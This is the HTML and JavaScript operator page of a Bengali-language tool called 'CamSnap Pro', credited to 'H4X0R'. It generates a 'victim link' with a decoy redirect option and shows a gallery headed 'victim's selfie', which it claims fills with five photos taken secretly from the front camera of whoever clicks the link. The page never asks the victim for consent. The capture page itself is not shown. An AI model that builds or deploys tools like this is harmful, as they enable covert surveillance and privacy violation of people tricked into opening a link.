<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CamSnap • Instant Selfie Grabber</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
    body{background:#f9f9fb;color:#222;}
    header{background:#fff;padding:20px;text-align:center;border-bottom:1px solid #eee;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
    header img{height:60px;border-radius:12px;}
    main{max-width:560px;margin:20px auto;padding:0 16px;}
    .card{background:#fff;border-radius:20px;padding:35px;box-shadow:0 10px 40px rgba(0,0,0,0.1);border:1px solid #eaeaea;}
    h1{font-size:2.2em;text-align:center;margin-bottom:10px;}
    p{text-align:center;color:#555;margin-bottom:30px;font-size:1.1em;}
    button{background:#0066ff;color:#fff;border:none;padding:18px;font-size:1.2em;border-radius:16px;width:100%;cursor:pointer;font-weight:600;}
    button:hover{background:#0052cc;}

    #linkBox{margin-top:30px;padding:25px;background:#f0f8ff;border:2px dashed #0066ff;border-radius:16px;display:none;text-align:center;}
    input{width:100%;padding:16px;margin:12px 0;border:1px solid #ddd;border-radius:14px;font-size:1.05em;background:#fafafa;}
    .btns{margin-top:15px;}
    .btn-small{display:inline-block;padding:12px 25px;margin:6px;border-radius:12px;font-size:1em;}
    .copy-btn{background:#28a745;color:#fff;}
    .save-btn{background:#333;color:#fff;}

    .photos-section{margin-top:40px;}
    .title{text-align:center;color:#0066ff;font-weight:600;font-size:1.2em;margin-bottom:18px;}
    #photoScroll{overflow-x:auto;white-space:nowrap;padding:15px 0;display:flex;gap:16px;}
    #photoScroll::-webkit-scrollbar{display:none;}
    .photo-item img{
      height:420px;width:auto;max-width:none;border-radius:18px;
      border:5px solid #0066ff;box-shadow:0 12px 35px rgba(0,102,255,0.4);
      cursor:pointer;object-fit:contain;background:#000;
    }
    #dots{display:flex;justify-content:center;gap:12px;margin-top:18px;}
    .dot{width:12px;height:12px;background:#ccc;border-radius:50%;transition:0.3s;}
    .dot.active{background:#0066ff;transform:scale(1.4);}
    .loading{text-align:center;padding:60px 0;color:#777;font-size:1.1em;}
    footer{text-align:center;padding:25px;color:#888;font-size:0.95em;background:#fff;border-top:1px solid #eee;}
  </style>
</head>
<body>

<header>
  <img src="https://i.imgur.com/7K8vR2p.png" alt="CamSnap">
</header>

<main>
  <div class="card">
    <h1>CamSnap Pro</h1>
    <p>কেউ লিংকে ক্লিক করলেই তার ফ্রন্ট ক্যামেরা থেকে ৫টা অরিজিনাল সেলফি চলে আসবে!</p>

    <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>

    <div id="linkBox">
      <p style="color:#0066ff;font-weight:600;margin-bottom:15px;">তোমার লিংক রেডি!</p>

      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেমন: https://instagram.com) — খালি রাখলে ভিডিও প্লে হবে" value="">

      <input type="text" id="victimLink" readonly style="background:#f0f0f0;font-weight:600;padding:18px;font-size:1.1em;">

      <div class="btns">
        <button class="btn-small save-btn" onclick="updateLink()">সেভ করুন</button>
        <button class="btn-small copy-btn" onclick="copyLink()">কপি করুন</button>
      </div>

      <a href="" id="testLink" target="_blank" style="display:block;margin-top:18px;color:#0066ff;font-weight:600;text-decoration:underline;">মোবাইলে টেস্ট করো</a>
    </div>

    <div class="photos-section">
      <div class="title">ভিকটিমের সেলফি (অরিজিনাল সাইজ)</div>
      <div id="photoScroll"><div class="loading">অপেক্ষা করো... ছবি আসবে</div></div>
      <div id="dots">
        <span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span>
      </div>
    </div>
  </div>
</main>

<footer>Developed by H4X0R • 100% Working 2025</footer>

<script>
let currentId = null;
const viewUrl = location.href.split('/').slice(0,-1).join('/') + '/view.html';

function generateLink() {
  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
  updateLink();
  document.getElementById("linkBox").style.display = "block";
  document.getElementById("photoScroll").innerHTML = `<div class="loading">ভিডিও প্লে করলে ছবি আসবে...</div>`;
  resetDots();
  startChecking();
}

function updateLink() {
  const redirect = document.getElementById("redirectUrl").value.trim();
  const finalUrl = redirect ? redirect : `${viewUrl}?id=${currentId}`;
  document.getElementById("victimLink").value = finalUrl;
  document.getElementById("testLink").href = finalUrl;
}

function copyLink() {
  const input = document.getElementById("victimLink");
  input.select();
  navigator.clipboard.writeText(input.value);
  alert("লিংক কপি হয়ে গেছে!");
}

function resetDots() {
  document.querySelectorAll('.dot').forEach(d => {
    d.classList.remove('active'); d.style.background = '#ccc';
  });
}

function showPhotos(imgs) {
  const container = document.getElementById('photoScroll');
  container.innerHTML = '';
  imgs.forEach(src => {
    const div = document.createElement('div');
    div.className = 'photo-item';
    const img = document.createElement('img');
    img.src = src;
    img.onclick = () => window.open(src, '_blank');
    div.appendChild(img);
    container.appendChild(div);
  });
  document.querySelectorAll('.dot').forEach((dot, i) => {
    dot.classList.toggle('active', i < imgs.length);
    dot.style.background = i < imgs.length ? '#0066ff' : '#ccc';
  });
}

function startChecking() {
  if (!currentId) return;
  const check = () => {
    const data = localStorage.getItem('camsnap_' + currentId);
    if (data) {
      showPhotos(JSON.parse(data));
      localStorage.removeItem('camsnap_' + currentId);
    }
    setTimeout(check, 2000);
  };
  check();
}
</script>
</body>
</html>
